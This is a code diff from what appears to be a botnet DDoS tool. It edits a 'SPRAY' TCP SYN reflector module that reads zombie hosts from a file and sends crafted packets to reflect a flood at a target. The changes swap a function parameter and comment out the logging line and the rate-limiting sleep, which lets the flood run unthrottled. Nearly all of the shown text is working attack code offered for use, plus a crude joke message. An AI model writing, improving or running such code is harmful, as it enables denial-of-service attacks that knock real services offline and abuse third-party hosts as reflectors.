@@ -46,7 +46,7 @@ def sIP(base_stations): # extract 'base stations'
         s_zombie_ip = bs.get(s_zombie)
     return s_zombie_ip
 
-def sprayize(ip, sport, rounds, source = None):
+def sprayize(ip, sport, rounds, address_dict):
     f = open('botnet/zombies.txt') # use 'zombies' as 'base stations'
     base_stations = f.readlines()
     base_stations = [ base_station.replace('\n','') for base_station in base_stations ]
@@ -84,15 +84,15 @@ def sprayize(ip, sport, rounds, source = None):
             TCP_l.ack = SYNACK.seq+1
             try:
                 send(IP_p/TCP_l, verbose=0)
-                print(("[Info] [AI] [SPRAY] Redirecting 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"] -> [RE-FLUXING!]"))
-                time.sleep(1/SPRAY_SPEED) # sleep time required for balanced sucess
+                # print(("[Info] [AI] [SPRAY] Redirecting 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"] -> [RE-FLUXING!]"))
+                # time.sleep(1/SPRAY_SPEED) # sleep time required for balanced sucess
             except:
                 print(("[Error] [AI] [SPRAY] Failed to redirect 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"]"))
     except:
         print("[Error] [AI] [SPRAY] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class SPRAY(object):
-    def attacking(self, target, rounds, source = None):
+    def attacking(self, target, rounds, address_dict):
         print(("[Info] [AI] TCP SYN Reflector (SPRAY) is redirecting: [ " + str(rounds)+ " base stations ]"))
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -116,4 +116,4 @@ class SPRAY(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [SPRAY] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        sprayize(ip, sport, rounds, source) # attack with SPRAY using threading
+        sprayize(ip, sport, rounds, address_dict) # attack with SPRAY using threading
